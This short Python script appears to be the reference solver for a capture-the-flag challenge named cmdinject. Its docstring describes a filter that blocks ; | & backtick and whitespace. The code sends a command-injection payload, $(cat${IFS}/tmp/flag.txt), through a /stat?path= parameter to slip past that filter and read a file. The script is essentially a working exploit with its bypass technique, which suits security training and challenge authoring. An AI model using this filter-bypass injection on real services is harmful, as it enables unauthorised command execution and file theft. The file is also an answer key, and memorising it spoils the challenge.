"""Reference solver for cmdinject: bypass the filter with $()/${IFS}.

    python3 solve.py <host> <port>

The filter blocks ; | & backtick, whitespace and '..', but leaves command
substitution and ${IFS} open. Injecting `$(cat${IFS}/tmp/flag.txt)` makes stat
fail on a path whose name is the flag, and the error reflects it back.
"""
import json
import re
import sys
import urllib.parse
import urllib.request


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    payload = "$(cat${IFS}/tmp/flag.txt)"
    q = base + "/stat?path=" + urllib.parse.quote(payload, safe="")
    data = json.loads(urllib.request.urlopen(q, timeout=10).read())
    out = data.get("output", "")
    m = re.search(r"flag\{[^}]*\}", out)
    print(m.group(0) if m else out)


if __name__ == "__main__":
    main()
